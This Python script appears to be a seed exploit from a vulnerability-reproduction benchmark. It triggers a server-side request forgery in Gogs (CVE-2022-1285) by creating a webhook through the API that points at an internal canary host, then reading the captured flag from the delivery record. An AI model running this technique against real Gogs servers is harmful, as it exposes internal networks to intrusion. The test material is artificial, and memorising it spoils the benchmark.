#!/usr/bin/env python3
"""[GIVEN] CVE-2022-1285 seed exploit for gogs-cve-2026-47267.

A webhook whose payload URL points directly at an internal service
(http://canary:8000/flag) is created via the API (which lacks the localCIDR
validation that the UI applies). On v0 (0.12.7) webhook delivery performs NO
local-address re-check, so the hook is delivered straight into the internal
network and the canary's flag response is captured in the delivery record.
On v1 (0.14.2) delivery re-validates the hostname (CVE-2022-1285 fix) and the
task is refused before any response is recorded.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gogs_util as gu  # noqa: E402

CANARY_URL = "http://canary:8000/flag"


def candidate(*, version="v1", flag=None):
    token = gu.create_token(version)
    try:
        hook_id = gu.create_webhook_api(version, token, CANARY_URL)
    except Exception as e:
        return {"ok": False, "error": f"create hook: {e}"}
    gu.trigger_test_delivery(version, hook_id)
    body = gu.read_hook_delivery_body(version, hook_id)
    return {"ok": flag in body if flag else bool(body), "delivery_body": body[:400]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
